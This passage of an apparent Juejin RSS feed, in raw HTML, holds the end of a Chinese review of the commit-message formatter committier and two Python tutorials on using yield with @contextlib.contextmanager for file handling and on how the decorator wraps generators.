<li><strong>作用域（scope）自动提取</strong>：开启<code>autoScope</code>配置后，可从monorepo工作区包名（如packages/button→button）、变更文件所属目录（如src/components/table→table）自动提取scope；</li>
<li><strong>空值自动补全</strong>：若提交消息仅写了核心描述（如“修改登录逻辑”），会自动补全默认type（如fix），避免消息缺失关键维度。</li>
</ul>
<p><strong>示例</strong>：
开启<code>autoScope: "replaceToPackageName"</code>后，在monorepo的<code>packages/button</code>目录提交：</p>
<pre><code class="hljs language-bash" lang="bash">git commit -m <span class="hljs-string">"优化按钮样式"</span>
</code></pre>
<p>格式化后：</p>
<pre><code class="hljs language-bash" lang="bash">🐛 fix(button): 优化按钮样式
</code></pre>
<h4 data-id="heading-10">3. 正文与脚注格式化：保持结构整洁</h4>
<p>除了提交标题（subject），committier还会优化提交消息的正文（body）和脚注（footer）：</p>
<ul>
<li>自动为正文/脚注补充空行分隔，符合“标题空一行+正文+空一行+脚注”的规范结构；</li>
<li>清理正文/脚注中的多余缩进、重复换行；</li>
<li>保留脚注中的关键标记（如<code>Closes #123</code>、<code>BREAKING CHANGE:</code>），确保关联issue、变更说明不丢失。</li>
</ul>
<h3 data-id="heading-11">自定义配置</h3>
<p>如果默认的emoji或提交类型不符合团队习惯，可快速修改配置。在项目根目录新建<code>committier.config.js</code>，示例如下：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">"committier"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-comment">// 关闭自动emoji（默认开启）</span>
  <span class="hljs-attr">autoEmoji</span>: <span class="hljs-literal">false</span>,
  <span class="hljs-comment">// 自动从工作区包名推断作用域</span>
  <span class="hljs-attr">autoScope</span>: <span class="hljs-string">"replaceToPackageName"</span>,
  <span class="hljs-comment">// 修改默认提交类型为feat</span>
  <span class="hljs-attr">defaultType</span>: <span class="hljs-string">"feat"</span>
  <span class="hljs-comment">// 开启自动生成默认描述信息来兜底</span>
  <span class="hljs-attr">defaultDescription</span>: <span class="hljs-literal">true</span>
});
</code></pre>
<p>committier支持多种格式的配置文件，哪怕只改个别字段，也能轻松覆盖默认行为。</p>
<h3 data-id="heading-12">体验总结</h3>
<p>committier最打动我的点，在于<strong>零配置起步+无感格式化</strong> 5分钟就能完成接入，提交代码时无需额外操作，就能自动生成规范的提交消息，既降低了团队规范落地的门槛，又节省了手动调整格式的时间。</p>
<p>不管是个人小项目还是多人协作的大型项目，这款工具都能显著提升提交信息的质量和开发效率，还没试过的朋友不妨赶紧体验一波！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python yield 的正确使用]]></title>    <link>https://juejin.cn/post/7581457966966079498</link>    <guid>https://juejin.cn/post/7581457966966079498</guid>    <pubDate>2025-12-09T03:29:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581457966966079498" data-draft-id="7581470169839976486" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python yield 的正确使用"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2025-12-09T03:29:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Xier"/> <meta itemprop="url" content="https://juejin.cn/user/1152710585356295"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python yield 的正确使用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1152710585356295/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Xier
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:29:39.000Z" title="Tue Dec 09 2025 03:29:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>定义上下文管理器</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> contextlib

<span class="hljs-meta">@contextlib.contextmanager</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">open_managed_file</span>(<span class="hljs-params">filepath, mode=<span class="hljs-string">'r'</span></span>):
    <span class="hljs-string">"""
    一个上下文管理器，用于安全地打开和关闭文件。
    """</span>
    f = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># 1. 资源获取/进入上下文 (__enter__)</span>
        f = <span class="hljs-built_in">open</span>(filepath, mode)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[ENTER]: 成功打开文件 '<span class="hljs-subst">{filepath}</span>'，模式为 '<span class="hljs-subst">{mode}</span>'"</span>)
        
        <span class="hljs-comment"># 2. 暂停并返回资源</span>
        <span class="hljs-comment"># yield 后面的值 (f) 将被绑定到 with ... as 后的变量上</span>
        <span class="hljs-keyword">yield</span> f 

    <span class="hljs-keyword">except</span> FileNotFoundError:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[EXIT]: 错误！文件 '<span class="hljs-subst">{filepath}</span>' 未找到。"</span>)
        <span class="hljs-keyword">raise</span>
        
    <span class="hljs-keyword">finally</span>:
        <span class="hljs-comment"># 3. 资源清理/退出上下文 (__exit__)</span>
        <span class="hljs-keyword">if</span> f:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[EXIT]: 正在关闭文件 '<span class="hljs-subst">{filepath}</span>'..."</span>)
            f.close()
</code></pre>
<h3 data-id="heading-0">使用 <code>with</code> 语句进行文件操作</h3>
<p>我们首先创建一个临时文件供读取，然后使用上下文管理器。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 1. 创建一个测试文件</span>
TEST_FILE = <span class="hljs-string">"test_config.txt"</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(TEST_FILE, <span class="hljs-string">"w"</span>) <span class="hljs-keyword">as</span> temp:
    temp.write(<span class="hljs-string">"Setting A=10\n"</span>)
    temp.write(<span class="hljs-string">"Setting B=20\n"</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">30</span>)

<span class="hljs-comment"># 2. 使用上下文管理器读取文件</span>
<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">with</span> open_managed_file(TEST_FILE, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> file_handle:
        <span class="hljs-comment"># 在 with 块内，file_handle 就是 open_managed_file 中 yield 返回的文件对象</span>
        content = file_handle.read()
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n[WITH BLOCK]: 文件内容读取完成。"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"---"</span>)
        <span class="hljs-built_in">print</span>(content.strip())
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"---"</span>)

    <span class="hljs-comment"># 当 with 块结束时，文件已被自动关闭 (执行了 finally 块)</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"上下文管理块正常退出。"</span>)

<span class="hljs-keyword">except</span> FileNotFoundError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"程序捕获到文件未找到的错误。"</span>)
</code></pre>
<h3 data-id="heading-1">运行结果（会显示整个流程）：</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">------------------------------</span>
[<span class="hljs-string">ENTER</span>]<span class="hljs-string">:</span> <span class="hljs-string">成功打开文件</span> <span class="hljs-string">'test_config.txt'</span><span class="hljs-string">，模式为</span> <span class="hljs-string">'r'</span>

[<span class="hljs-string">WITH</span> <span class="hljs-string">BLOCK</span>]<span class="hljs-string">:</span> <span class="hljs-string">文件内容读取完成。</span>
<span class="hljs-meta">---</span>
<span class="hljs-string">Setting</span> <span class="hljs-string">A=10</span>
<span class="hljs-string">Setting</span> <span class="hljs-string">B=20</span>
<span class="hljs-meta">---</span>
[<span class="hljs-string">EXIT</span>]<span class="hljs-string">:</span> <span class="hljs-string">正在关闭文件</span> <span class="hljs-string">'test_config.txt'</span><span class="hljs-string">...</span>
<span class="hljs-string">上下文管理块正常退出。</span>
</code></pre>
<h3 data-id="heading-2">异常处理演示</h3>
<p>即使在 <code>with</code> 块内部发生异常，<code>finally</code> 块也会确保文件被关闭：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">30</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"演示异常情况下的清理："</span>)

<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">with</span> open_managed_file(TEST_FILE, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> file_handle:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"[WITH BLOCK]: 尝试读取文件..."</span>)
        
        <span class="hljs-comment"># 故意制造一个错误（例如，除以零）</span>
        result = <span class="hljs-number">10</span> / <span class="hljs-number">0</span> 
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"这个不会被打印: <span class="hljs-subst">{result}</span>"</span>)
        
<span class="hljs-keyword">except</span> ZeroDivisionError:
    <span class="hljs-comment"># 外部捕获了异常，但文件已经在退出时关闭了</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n[外部]: 成功捕获到 ZeroDivisionError。"</span>)
    <span class="hljs-comment"># 注意，即使发生了异常，open_managed_file 内部的 finally 块也会先执行。</span>
</code></pre>
<h3 data-id="heading-3">异常运行结果（显示清理优先于异常捕获）：</h3>
<pre><code class="hljs language-markdown" lang="markdown">------------------------------
演示异常情况下的清理：
[<span class="hljs-symbol">ENTER</span>]: <span class="hljs-link">成功打开文件 'test_config.txt'，模式为 'r'</span>
[<span class="hljs-symbol">WITH BLOCK</span>]: <span class="hljs-link">尝试读取文件...</span>
[<span class="hljs-symbol">EXIT</span>]: <span class="hljs-link">正在关闭文件 'test_config.txt'...</span>

[<span class="hljs-symbol">外部</span>]: <span class="hljs-link">成功捕获到 ZeroDivisionError。</span>
</code></pre>
<p>通过这种方式，我们使用了一个简洁的生成器函数 (<code>open_managed_file</code>)，结合 <code>@contextlib.contextmanager</code> 和 <code>try...finally</code> 结构，<strong>优雅且安全</strong>地实现了上下文管理。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[@contextlib.contextmanager 的作用是什么]]></title>    <link>https://juejin.cn/post/7581470169840058406</link>    <guid>https://juejin.cn/post/7581470169840058406</guid>    <pubDate>2025-12-09T03:34:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581470169840058406" data-draft-id="7581448482544943130" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="@contextlib.contextmanager 的作用是什么"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2025-12-09T03:34:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Xier"/> <meta itemprop="url" content="https://juejin.cn/user/1152710585356295"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            @contextlib.contextmanager 的作用是什么
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1152710585356295/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Xier
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:34:37.000Z" title="Tue Dec 09 2025 03:34:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong><code>with</code> 语句根本听不懂函数的语言，它只听得懂“类”的语言（即 <code>__enter__</code> 和 <code>__exit__</code>）。</strong></p>
<p><code>@contextlib.contextmanager</code> 的作用就是<strong>把你的生成器函数“包装”成一个 <code>with</code> 语句能听懂的类</strong>。</p>
<p>下面我为你拆解它的核心机制：</p>
<h3 data-id="heading-0">1. 为什么不能直接用？</h3>
<p>如果你直接把一个包含 <code>try...finally</code> 和 <code>yield</code> 的普通生成器函数放到 <code>with</code> 后面，程序会直接<strong>报错</strong>。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_gen</span>():
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">yield</span> <span class="hljs-number">1</span>
    <span class="hljs-keyword">finally</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"清理工作"</span>)

<span class="hljs-comment"># ❌ 这样写会报错！</span>
<span class="hljs-comment"># AttributeError: __enter__</span>
<span class="hljs-comment"># with my_gen() as x:</span>
<span class="hljs-comment">#     pass</span>
</code></pre>
<p><strong>原因：</strong> <code>with</code> 语句期望后面的对象必须有 <code>__enter__</code> 和 <code>__exit__</code> 方法。普通的生成器函数返回的是一个生成器对象，它没有这两个方法。</p>
<h3 data-id="heading-1">2. <code>@contextlib.contextmanager</code> 到底做了什么？</h3>
<p>当你给函数加上这个装饰器时，Python 在背后做了一个“偷天换日”的操作：</p>
<ol>
<li>它捕获了你的生成器函数。</li>
<li>它返回了一个<strong>新的对象</strong>（Helper Class），这个对象内部实现了 <code>__enter__</code> 和 <code>__exit__</code>。</li>
<li>它在 <code>__exit__</code> 方法里，帮你去<strong>手动触发</strong>了生成器的后续代码（也就是你的 <code>finally</code> 部分）。</li>
</ol>
<h3 data-id="heading-2">3. 执行流程图解（核心原理）</h3>
<p>为了让你明白 <code>finally</code> 是怎么被触发的，请看这个流程：</p>
<ol>
<li>
<p><strong><code>with</code> 开始</strong> -&gt; 调用装饰器生成的对象的 <code>__enter__</code>。</p>
</li>
<li>
<p><strong><code>__enter__</code> 内部</strong> -&gt; 调用 <code>next(your_generator)</code>。</p>
<ul>
<li>生成器开始运行 -&gt; 遇到 <code>yield</code> 暂停。</li>
<li><code>__enter__</code> 拿到 <code>yield</code> 出来的值，并返回给 <code>as</code> 后的变量。</li>
</ul>
</li>
<li>
<p><strong>用户代码块 (<code>with</code> 内部)</strong> -&gt; 执行你的业务逻辑。</p>
</li>
<li>
<p><strong><code>with</code> 结束</strong> -&gt; 自动调用装饰器生成的对象的 <code>__exit__</code>。</p>
</li>
<li>
<p><strong><code>__exit__</code> 内部</strong> -&gt; <strong>关键点来了！</strong></p>
<ul>
<li>它会再次调用 <code>next(your_generator)</code> (或者 <code>throw</code> 如果有异常)。</li>
<li><strong>这导致生成器从 <code>yield</code> 后面继续运行。</strong></li>
<li>因此，你的 <code>finally</code> 代码块才得以执行。</li>
</ul>
</li>
</ol>
<h3 data-id="heading-3">4. 自己模拟一个 <code>contextmanager</code></h3>
<p>为了证明这一点，我们可以写一个简化版的类，来实现和 <code>@contextlib.contextmanager</code> 一样的功能。看完这个你就彻底懂了：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyContextManagerWrapper</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, generator_func, *args, **kwargs</span>):
        <span class="hljs-comment"># 1. 初始化时，创建一个生成器对象</span>
        self.gen = generator_func(*args, **kwargs)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__enter__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># 2. 进入 with 时，运行生成器直到遇到 yield</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">next</span>(self.gen)
        <span class="hljs-keyword">except</span> StopIteration:
            <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">"生成器没有 yield 任何值！"</span>)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__exit__</span>(<span class="hljs-params">self, exc_type, exc_value, traceback</span>):
        <span class="hljs-comment"># 3. 退出 with 时，核心逻辑在这里！</span>
        <span class="hljs-keyword">if</span> exc_type <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">try</span>:
                <span class="hljs-comment"># 如果没有异常，让生成器继续运行（执行 yield 后面的代码，即 finally）</span>
                <span class="hljs-built_in">next</span>(self.gen)
            <span class="hljs-keyword">except</span> StopIteration:
                <span class="hljs-comment"># 生成器正常结束是预期的</span>
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">try</span>:
                <span class="hljs-comment"># 如果有异常，把异常扔回给生成器</span>
                self.gen.throw(exc_type, exc_value, traceback)
            <span class="hljs-keyword">except</span> (StopIteration, exc_type):
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
            <span class="hljs-keyword">except</span> Exception:
                <span class="hljs-comment"># 处理生成器内部的新异常</span>
                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

<span class="hljs-comment"># --- 测试 ---</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">simple_func</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"1. setup"</span>)
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">yield</span> <span class="hljs-string">"资源"</span>
    <span class="hljs-keyword">finally</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"3. teardown (finally 执行了)"</span>)

<span class="hljs-comment"># 使用我们要包装的类</span>
<span class="hljs-keyword">with</span> MyContextManagerWrapper(simple_func) <span class="hljs-keyword">as</span> res:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"2. inside with: <span class="hljs-subst">{res}</span>"</span>)
</code></pre>
<p><strong>输出：</strong></p>
<p>Plaintext</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> setup
<span class="hljs-bullet">2.</span> inside with: 资源
<span class="hljs-bullet">3.</span> teardown (finally 执行了)
</code></pre>
<h3 data-id="heading-4">总结</h3>
